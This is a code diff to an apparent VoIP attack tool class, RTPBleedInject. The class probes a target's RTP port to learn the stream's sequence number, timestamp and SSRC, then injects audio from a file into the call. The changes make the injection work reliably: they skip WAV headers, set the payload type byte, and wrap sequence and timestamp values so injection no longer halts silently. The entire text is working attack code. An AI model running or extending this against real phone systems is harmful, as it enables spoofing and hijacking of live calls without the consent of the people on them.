@@ -53,13 +53,24 @@ class RTPBleedInject:
             file = open(self.file, "rb")
             data = file.read()
             file.close()
+
+            # a WAV container starts with RIFF: the RTP payload has to be the
+            # raw audio, so the header is skipped up to the data chunk
+            if data[0:4] == b"RIFF" and data[8:12] == b"WAVE":
+                pos = data.find(b"data")
+
+                if pos > -1:
+                    data = data[pos + 8 :]
+                    print(
+                        f"{self.c.YELLOW}[+] WAV header skipped ({pos + 8} bytes){self.c.WHITE}"
+                    )
             print(
                 f"{self.c.YELLOW}[+] Sending RTP packets to {self.c.CYAN}{self.ip}{self.c.WHITE}:{self.c.CYAN}{str(self.port)}{self.c.WHITE} to obtain info about the streams{self.c.WHITE}"
             )
         except:
             print(f"{self.c.RED}Error opening file {self.file}")
             print(self.c.WHITE)
-            exit()
+            sys.exit()
 
         # Create a UDP socket
         try:
@@ -101,7 +112,8 @@ class RTPBleedInject:
                     seq = msg[4:8]
                     timestamp = msg[8:16]
                     ssrc = msg[16:24]
-                    version = "8000"
+                    # byte[0] = 0x80 (RTP version 2), byte[1] = payload type
+                    version = "80%s" % format(int(self.payload) & 0x7F, "02x")
 
                     print(
                         f"{self.c.WHITE} received {str(size)} bytes from target port {str(rport)} with seq number {seq}"
@@ -120,14 +132,17 @@ class RTPBleedInject:
 
                     print(f"{self.c.YELLOW}[+] Injecting RTP audio ...{self.c.WHITE}")
 
-                    while cont - size < total and self.run == True:
+                    while cont < total and self.run == True:
                         packet = hexdata[cont : cont + (size * 2)]
 
-                        nseq = int("%s" % seq, base=16) + 1
-                        seq = hex(nseq)[2:].zfill(4)
+                        # both fields wrap around in RTP; without the mask the
+                        # hex string grew one digit, fromhex() raised and the
+                        # injection stopped inside a bare except, without a word
+                        nseq = (int("%s" % seq, base=16) + 1) & 0xFFFF
+                        seq = "%04x" % nseq
 
-                        ntimestamp = int("%s" % timestamp, base=16) + size
-                        timestamp = hex(ntimestamp)[2:].zfill(8)
+                        ntimestamp = (int("%s" % timestamp, base=16) + size) & 0xFFFFFFFF
+                        timestamp = "%08x" % ntimestamp
 
                         print(
                             f"{self.c.YELLOW}[+] Sending packet {str(cont)} of {str(total)} (version: {version}, seq: {seq}, timestamp: {timestamp}, ssrc: {ssrc})",
